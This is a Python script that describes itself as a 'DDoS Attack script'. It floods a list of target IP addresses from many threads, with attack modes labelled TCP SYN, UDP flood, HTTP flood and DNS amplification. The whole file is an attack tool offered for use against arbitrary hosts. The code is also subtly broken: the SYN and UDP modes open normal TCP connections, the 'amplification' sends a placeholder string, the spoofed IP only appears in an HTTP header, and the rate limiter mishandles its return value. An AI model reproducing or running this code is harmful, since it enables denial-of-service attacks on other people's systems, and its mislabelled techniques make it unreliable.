import argparse
import time
import socket
from concurrent.futures import ThreadPoolExecutor
import logging
import secrets

TOKEN_RATE = 1  # 1 token per second
TOKEN_CAPACITY = 10  # Maximum 10 tokens can be stored in the bucket

class Attack:
    def __init__(self, target, port, fake_ip, attack_type, duration):
        self.target = target
        self.port = port
        self.fake_ip = fake_ip
        self.attack_type = attack_type
        self.duration = duration
        self.already_connected = 0
        self.logger = logging.getLogger('attack')
        self.logger.setLevel(logging.INFO)
        self.handler = logging.FileHandler('attack.log')
        self.handler.setLevel(logging.INFO)
        self.logger.addHandler(self.handler)

    def start_attack(self):
        start_time = time.time()
        last_request_time = start_time
        tokens = 0
        while time.time() - start_time < self.duration:
            try:
                # Use the rate limiter to wait until a token is available
                tokens = self._rate_limiter(tokens, last_request_time)

                port = self.port
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)  # Set a timeout of 5 seconds for the socket connection

                try:
                    s.connect((self.target, port))
                except socket.timeout:
                    self.logger.error("Socket timed out")
                    return
                except Exception as e:
                    self.logger.error(f"Error: {str(e)}")
                    return

                if self.attack_type == 'TCP_SYN':
                    s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode("ascii"), (self.target, port))
                    s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode("ascii"), (self.target, port))
                elif self.attack_type == 'UDP_Flood':
                    s.sendto(b"randomdata", (self.target, port))
                elif self.attack_type == 'HTTP_Flood':
                    s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode("ascii"), (self.target, port))
                elif self.attack_type == 'DNS_Amplification':
                    s.sendto(("DNS query").encode("ascii"), (self.target, port))

                s.close()

                self.already_connected += 1
                if self.already_connected % 500 == 0:
                    self.logger.info(f"{self.already_connected} connections made")

                # Sleep for a random amount of time between 0 and 3 seconds
                time.sleep(secrets.randbelow(3000) / 1000)

                # Update the last request time and subtract a token from the bucket
                last_request_time = time.time()
                tokens -= 1

            except Exception as e:
                self.logger.error(f"Error: {str(e)}")

    def _rate_limiter(self, tokens, last_request_time, retries=0):
        # Calculate the time elapsed since the last request
        time_since_last_request = time.time() - last_request_time

        # Add tokens to the bucket at the token rate
        tokens += time_since_last_request * TOKEN_RATE

        # Cap the number of tokens in the bucket at the token capacity
        tokens = min(tokens, TOKEN_CAPACITY)

        # Wait until a token is available in the bucket
        while tokens < 1:
            time.sleep(0.001)
            tokens += time_since_last_request * TOKEN_RATE

        try:
            # Update the last request time and subtract a token from the bucket
            last_request_time = time.time()
            tokens -= 1

            # Return the updated token count and last request time
            return tokens, last_request_time

        except Exception as e:
            # If the connection failed, wait for an increasingly longer period
            # between retries using exponential backoff
            if retries < 5:
                backoff_time = secrets.randbelow(2 ** retries)
                time.sleep(backoff_time)
                return self._rate_limiter(tokens, last_request_time, retries=retries+1)
            else:
                self.logger.error(f"Connection failed after {retries} retries: {str(e)}")
                return tokens, last_request_time

def launch_attack(targets, port, fake_ip, attack_type, duration):
    for target in targets:
        attack = Attack(target, port, fake_ip, attack_type, duration)
        attack.start_attack()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDoS Attack script')
    parser.add_argument('targets', help='Comma-separated list of target IP addresses')
    parser.add_argument('port', type=int, help='Target port number')
    parser.add_argument('fake_ip', help='Fake IP address to use in the attack')
    parser.add_argument('attack_type', choices=['TCP_SYN', 'UDP_Flood', 'HTTP_Flood', 'DNS_Amplification'], help='Type of attack')
    parser.add_argument('--duration', type=int, default=60, help='Duration of the attack in seconds')
    parser.add_argument('--threads', type=int, default=50, help='Maximum number of threads in the pool')
    args = parser.parse_args()

    targets = args.targets.split(',')

    logging.basicConfig(level=logging.INFO, filename='attack.log', filemode='w')
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for i in range(args.threads):
            executor.submit(launch_attack, targets, args.port, args.fake_ip, args.attack_type, args.duration)







